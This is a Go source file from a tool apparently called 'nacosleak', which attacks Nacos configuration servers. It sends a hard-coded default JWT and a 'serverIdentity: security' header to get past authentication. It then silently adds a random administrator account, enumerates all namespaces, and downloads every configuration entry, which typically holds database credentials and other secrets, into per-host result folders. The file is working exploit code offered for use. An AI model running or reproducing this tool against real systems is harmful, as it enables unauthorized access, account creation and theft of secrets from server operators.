package core

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"nacosleak/constant"
	"nacosleak/utils"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type Nacos struct {
	Url string
	Auth
	NameSpace []*NameSpace
	Proxy     string
}

type Auth struct {
	Username string
	Password string
	Jwt      string
}

type NameSpace struct {
	Tenant  string
	Name    string
	Content Content
}

type Content struct {
	TotalCount     float64 `json:"totalCount"`
	PageNumber     float64 `json:"pageNumber"`
	PagesAvailable float64 `json:"pagesAvailable"`
	PageItems      []Item  `json:"pageItems"`
}

type Item struct {
	Id               string `json:"id"`
	DataId           string `json:"dataId"`
	Group            string `json:"group"`
	Content          string `json:"content"`
	Md5              string `json:"md5"`
	EncryptedDataKey string `json:"encryptedDataKey"`
	Tenant           string `json:"tenant"`
	AppName          string `json:"appName"`
	Type             string `json:"type"`
}

func NewNacosClient(url, proxy string, auth ...Auth) (*Nacos, error) {
	if len(auth) == 0 {
		return &Nacos{
			Url:   url,
			Proxy: proxy,
		}, nil
	}
	return &Nacos{
		Url:   url,
		Auth:  auth[0],
		Proxy: proxy,
	}, nil
}

func (f *Nacos) SetJwt() error {
	if f.Password == "" || f.Username == "" {
		return fmt.Errorf("error password or username ")
	}
	body := fmt.Sprintf("username=%s&password=%s", f.Username, f.Password)
	header := map[string]string{
		"Content-Type": "application/x-www-form-urlencoded",
	}
	req, err := doRequest(constant.POST, f.Url+constant.LOGIN_API, strings.NewReader(body), header, f.Proxy)
	if err != nil {
		return err
	}
	respbody, err := ioutil.ReadAll(req.Body)
	if err != nil {
		return err
	}
	if string(respbody) == "unknown user!" {
		return fmt.Errorf("[" + f.Url + "]" + "Auth failed.")

	}
	var data map[string]interface{}
	if err = json.Unmarshal(respbody, &data); err != nil {
		return err
	}
	f.Jwt = data["accessToken"].(string)
	f.Jwt = "Bearer " + f.Jwt
	fmt.Println("[", f.Url, "]  [+] get accessToken success")
	return nil
}

//获取Namespace

func (f *Nacos) GetNameSpace() error {
	if f.Url == "" {
		return fmt.Errorf("empty url")
	}
	if f.Jwt == "" {
		f.Jwt = constant.DEFAULT_JWT
	}
	header := map[string]string{
		"Authorization": f.Jwt,
	}
	resp, err := doRequest(constant.GET, f.Url+constant.NAMESPACE_API, nil, header, f.Proxy)

	if err != nil {
		return err
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if resp.StatusCode != 200 {
		return fmt.Errorf("["+f.Url+"]", string(body))
	}
	var data map[string]interface{}
	err = json.Unmarshal(body, &data)
	if err != nil {
		return fmt.Errorf("[ ERROR ] handle json.Unmarshal fail.")

	}
	ns := data["data"].([]interface{})
	for _, v := range ns {
		vv := v.(map[string]interface{})
		f.NameSpace = append(f.NameSpace, &NameSpace{
			Tenant: vv["namespace"].(string),
			Name:   vv["namespaceShowName"].(string),
		})
	}
	return nil
}

func doRequest(method, api string, body io.Reader, header map[string]string, proxy string) (*http.Response, error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	if proxy != "" {
		tr.Proxy = func(req *http.Request) (*url.URL, error) {
			// 返回代理URL
			return url.Parse(proxy)
		}
	}
	clt := &http.Client{
		Transport: tr,
		Timeout:   5 * time.Second,
	}
	req, _ := http.NewRequest(method, api, body)
	for k, v := range header {
		req.Header.Set(k, v)
	}
	return clt.Do(req)
}

func (f *Nacos) AddUser() error {
	header := map[string]string{
		"Authorization":  constant.DEFAULT_JWT,
		"Content-Type":   "application/x-www-form-urlencoded",
		"serverIdentity": "security",
	}
	usrname := utils.GenerateRandomString()
	pwd := utils.GenerateRandomString()
	body := fmt.Sprintf("username=%s&password=%s", usrname, pwd)
	resp, err := doRequest(constant.POST, f.Url+constant.ADD_USER_API, strings.NewReader(body), header, f.Proxy)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	respbody, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}
	if strings.Contains(string(respbody), "already exist") {
		return fmt.Errorf("add user fail,user exist ")
	}
	var data map[string]interface{}
	err = json.Unmarshal(respbody, &data)
	if err != nil {
		return err
	}
	if data["code"].(float64) == 200 {
		fmt.Printf("[%s] add user success! [+] %s/%s\n", f.Url, usrname, pwd)
		f.Auth.Username = usrname
		f.Auth.Password = pwd
	}
	return nil
}

func (f *Nacos) GetConfig() (err error) {
	if f.Jwt == "" {
		f.Jwt = constant.DEFAULT_JWT
	}
	header := map[string]string{
		"Authorization": f.Jwt,
	}
	for i, v := range f.NameSpace {
		var resp *http.Response
		if v.Name == "public" {
			resp, err = doRequest(constant.GET, f.Url+fmt.Sprintf(constant.CONFIG_API, ""), nil, header, f.Proxy)
		} else {
			resp, err = doRequest(constant.GET, f.Url+fmt.Sprintf(constant.CONFIG_API, v.Tenant), nil, header, f.Proxy)
		}
		if err != nil {
			return err
		}
		var body []byte
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			err = fmt.Errorf("[ ERROR ] Get Resp's body fail .")
			return
		}
		var config Content
		if string(body) != "" {
			err = json.Unmarshal(body, &config)
			if err != nil {
				err = fmt.Errorf("json.Unmarshal fail")
				fmt.Println(config.PageItems)
				return
			}
			f.NameSpace[i].Content = config
		}
	}
	return nil
}

func (f *Nacos) PrintNameSpace() {
	for _, v := range f.NameSpace {
		fmt.Println(v.Name, v.Tenant, v.Content)
	}
}

func (f *Nacos) SaveConfig(BasePath string) (err error) {
	var FolderName string
	domain, _ := url.Parse(f.Url)
	if domain.Host != "" {
		FolderName = strings.Replace(domain.Host, ".", "_", -1)
	} else {
		FolderName = strings.Replace(domain.String(), ".", "_", -1)
	}
	FolderName = strings.Replace(FolderName, ":", "_", -1)
	if BasePath == "" {
		BasePath, _ = os.Getwd()
	}
	foldPath := filepath.Join(BasePath, "results", FolderName)
	if !exists(foldPath) {
		err = os.MkdirAll(foldPath, 0766)
		if err != nil {
			fmt.Println(err)
		}
	}
	for _, config := range f.NameSpace {
		nameSpacePath := filepath.Join(foldPath, config.Name)
		if !exists(nameSpacePath) {
			err = os.MkdirAll(nameSpacePath, 0766)
			if err != nil {
				fmt.Println(err)
			}
		}
		//fmt.Println(nameSpacePath)
		allConfPath := nameSpacePath + "/all_config.txt"
		ff, err := os.Create(allConfPath)
		if err != nil {
			return fmt.Errorf("[ ERROR ] create file fail .", err.Error())

		}
		var allConf string
		for _, data := range config.Content.PageItems {
			allConf = allConf + fmt.Sprintf("\n\n--------------------      %v     --------------------\n\n", data.DataId) + data.Content
		}
		_, err = ff.Write([]byte(allConf))

	}
	fmt.Println("[ SUCCESS ] Save in path:" + foldPath)
	return nil
}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
